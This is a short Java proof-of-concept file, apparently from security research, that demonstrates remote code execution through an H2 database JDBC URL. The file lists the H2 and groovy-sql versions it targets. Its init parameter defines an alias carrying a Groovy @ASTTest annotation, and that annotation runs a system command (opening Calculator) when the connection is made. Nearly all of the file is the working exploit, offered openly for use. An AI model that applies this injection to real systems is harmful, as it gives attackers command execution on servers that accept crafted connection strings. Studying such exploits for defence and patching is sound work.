package com.example.h2attack;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * Groovy
 *
 * version
 * com.h2database:h2
 * [1.3.x, 1.4.x, 2.0.x, 2.1.x, 2.2.x]
 * [1.2.130, 1.2.147]
 * org.codehaus.groovy:groovy-sql
 * ALL [3.0.x, 2.6.x, 2.5.x, 2.4.x, 2.3.x, 2.2.x, 2.1.x, 2.0.x]
 *
 * @author Whoopsunix
 */
public class Groovy {
    public static void main(String[] args) throws Exception {
        Class.forName("org.h2.Driver");

        String attackUrl = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;init=CREATE ALIAS T5 AS '@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")})def x'";
        Connection connection = DriverManager.getConnection(attackUrl);
    }
}
